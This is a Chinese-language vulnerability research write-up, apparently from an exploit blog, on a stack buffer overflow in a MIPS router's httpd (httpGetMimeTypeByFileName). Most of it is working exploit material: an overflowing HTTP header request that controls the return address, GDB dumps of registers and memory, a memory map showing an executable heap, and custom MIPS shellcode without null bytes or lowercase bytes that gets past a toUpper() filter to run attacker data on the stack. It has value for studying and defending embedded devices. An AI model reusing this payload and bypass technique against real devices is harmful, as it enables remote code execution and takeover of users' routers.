### 优化后的文本

#### httpGetMimeTypeByFileName 函数分析
在 `httpGetMimeTypeByFileName` 函数的结尾，程序会执行以下操作：
1. 从堆栈中加载寄存器 `$s3`, `$s2`, `$s1`, 和 `$s0`。
2. 返回到调用者 (`jr $ra`)。
3. 调整堆栈指针 (`addiu $sp, 0x38`)。

在函数结尾处，应用程序将数据复制并覆盖缓冲区中的原始数据。然后通过弹出堆栈来修改堆栈数据，并允许用户控制返回地址。这意味着攻击者可以在 HTTPD 进程的上下文中远程执行代码。

#### toUpper() 过滤器
在解析 HTTP 头时，设备会在每次迭代一个字节时进行搜索（周期为 0x2e），并构建缓冲区。遇到句点后，缓冲区的数据会被传递给 `toUpper()` 函数，该函数将缓冲区中的每个 ASCII 字符转换为大写等效字符。

以下是相关的汇编代码：
```assembly
LOAD:00425D20 loc_425D20:
    LOAD:00425D20                 lbu     $a0, 0($a0)
    # 返回可能的大写版本字符
    LOAD:00425D24                 jalr    $t9 ; toUpper                      
    LOAD:00425D28                 nop
```

然而，当尝试通过 HTTP 标头发送 `shellcode` 时，系统无法避免 `toUpper()` 的调用，从而阻止了使用任何小写字母。例如，下面的 GET 请求：

```http
GET /fs/help HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Content-Length: 2
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 4
```

查看 `httpGetMimeTypeByFileName` 函数结尾最后一次跳转之前的寄存器状态，可以看到标头中的 'a' 字符（0x61）已经转换为它们的大写版本（0x41）。

```gdb
(GDB) i r
i r
              zero       at       v0       v1       a0       a1       a2       a3
 R0   00000000 10000400 00514004 00000035 7dfff821 0051432d 01010101 80808080 
                t0       t1       t2       t3       t4       t5       t6       t7
 R8   00000002 fffffffe 00000000 00000006 19999999 00000000 00000057 00425d2c 
                s0       s1       s2       s3       s4       s5       s6       s7
R16  41414141 41414141 41414141 41414141 41414141 006798f4 006798d0 00000000 
                t8       t9       k0       k1       gp       sp       s8       ra
R24  00000132 2ab02820 00000000 00000000 00598790 7dfff808 7dfffa62 41414141 
            status       lo       hi badvaddr    cause       pc
           0000040c 00059cf8 000001fa 00590cac 00000024 00425dcc 
 (GDB)
```

#### 漏洞分析
检查上述寄存器显示，在 `toUpper()` 调用之后，系统留下了可预测原始标头数据位置的指针。尽管终止了 `httpGetMimeTypeByFileName` 函数结尾的最后一次跳转，我们仍然可以检查堆栈上的数据。在这里，我们发现了现在的大写标头数据的一部分（包括 payload）存储在那里。

```gdb
(GDB) x/32s $sp
x/32s $sp
0x7dfff808:      ""
0x7dfff809:      ""
...
0x7dfff81f:      ""
0x7dfff820:      "5\r\n", 'A' ...
0x7dfff8e8:      'A' ...
0x7dfff9b0:      'A' ...
0x7dfffa78:      'A' ...
0x7dfffb40:      'A' , "\r\nCONTENT-LENGTH: 0\r\nACCEPT-ENCODING: GZIP, DEFLATE\r\nAUTH"...
0x7dfffc08:      "ORIZATION: BASIC YWRTAW46YWRTAW4=\r\nCONNECTION: KEEP-ALIVE\r\nUPGRADE-INSECURE-REQUESTS: 1\r\nCONTENT-LENGTH: 0\r\n\r\n"
0x7dfffc77:      ""
0x7dfffc78:      ""
0x7dfffc79:      ""
...
(GDB)
```

相反，如果我们检查寄存器 `$s5` 所指向的数据，我们会看到原始标头数据仍然可访问。

```gdb
(GDB) x/32s $s5+0x64
x/32s $s5+0x64
0x679958:        ""
0x679959:        ""
...
0x67995f:        ""
0x679960:        "/fs/help"
0x679969:        "elp"
0x67996d:        "HTTP/1.1"
0x679976:        "\n"
0x679978:        "ost: 192.168.0.1\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q"...
0x679a40:        "=0.5\r\n", 'a' ...
0x679b08:        'a' ...
0x679bd0:        'a' ...
0x679c98:        'a' ...
0x679d60:        'a' , "\r\nContent-Length: 0\r\nAccept-Encoding: gzip, deflate\r\nA"...
0x679e28:        "uthorization: Basic YWRtaW46YWRtaW4=\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nContent-Length: 0\r\n\r\n"
0x679e9a:        ""
0x679e9b:        ""
...
(GDB)
```

该部分内存的权限显示该范围是可执行的，因此我们可以直接跳转到原始数据头。

```sh
# cat /proc/12518/maps
cat /proc/12518/maps
00400000-00538000 r-xp 00000000 1f:02 69         /usr/bin/httpd
00578000-00594000 rw-p 00138000 1f:02 69         /usr/bin/httpd
00594000-006a6000 rwxp 00000000 00:00 0          [heap]
2aaa8000-2aaad000 r-xp 00000000 1f:02 359        /lib/ld-uClibc-0.9.30.so
2aaad000-2aaae000 rw-p 00000000 00:00 0 
2aaae000-2aab2000 rw-s 00000000 00:06 0          /SYSV0000002f (deleted)
2aaec000-2aaed000 r--p 00004000 1f:02 359        /lib/ld-uClibc-0.9.30.so
...
7f401000-7f600000 rwxp 00000000 00:00 0 
7fcf7000-7fd0c000 rwxp 00000000 00:00 0          [stack]
```

由于 `toUpper()` 和 `strcmp()` 的限制，导致这个路径无效。`toUpper()` 的使用创建了一个条件，其中任何小写字母都必须被视为无效字符。此外，由于我们的数据通过 `strcmp()` 调用，所以我们不能使用任何空字节。这些调用使我们无法使用以下任何字节：`0x00, 0x61-0x7a`。

#### 绕过 toUpper() 函数
为了研究 `toUpper()` 函数带来的问题，我们创建了一小段调用 `memcpy()` 的代码，它在获得 `$ra` 的控制权后并不使用任何小写字符或空字节来执行后续内容。使用此代码，我们能够以原始形式将标头数据复制到堆栈中并跳转到任意地点执行。

```assembly
move    $a0, $t9         # 将堆栈指针放入 arg1
addiu   $a0, 0x12C       # 增加 arg1 以防止覆盖这段代码
addiu   $a1, $s5, 0x198  # 将原始标头数据指针加载到 arg2
li      $a2, 0x374       # 加载大小到 arg3
li      $t9, 0x2AB01E20  # 加载 memcpy() 的地址到 $t9
jalr    $t9              # 调用 memcpy()
move    $t8, $t3         # 用于处理延迟槽而没有空字节的占位符
move    $t9, $sp         # 使用堆栈指针准备 $t9
addiu   $t9, 0x14C       # 增加 $t9 指针到原始标头
jalr    $t9              # 在堆栈上执行原始标头
move    $t8, $t3         # 用于处理延迟槽而没有空字节的占位符
```

通过这种方式，我们成功绕过了 `toUpper()` 函数的限制，并能够在堆栈上执行原始标头数据。